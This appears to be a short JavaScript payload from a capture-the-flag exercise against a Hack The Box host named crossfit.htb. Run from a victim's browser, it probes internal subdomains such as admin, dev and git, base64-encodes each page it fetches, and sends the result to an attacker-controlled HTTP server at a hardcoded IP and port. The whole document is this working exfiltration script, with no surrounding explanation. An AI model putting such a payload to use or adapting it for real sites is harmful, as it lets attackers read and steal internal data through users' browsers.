myhttpserver = 'http://10.10.16.110:1234/'
targeturl = 'ftp.crossfit.htb'
l=["admin","","test","ftp","dev","git"];


for(i=0;i<l.length;i++)
{
    try{
        n=l[i];
        req = new XMLHttpRequest;
    
        req.onreadystatechange = function() {
            if (req.readyState == 4) {
                    //document.getElementById("d").innerHTML+=","+this.status;
                    req2 = new XMLHttpRequest;
                    req2.open('GET', myhttpserver + n + btoa(this.responseText),false);
                    req2.send();
                }
        }
        req.open('GET', 'http://'+n+targeturl, false);
        req.send();
   }
   catch(err) {
     continue;
   }
}
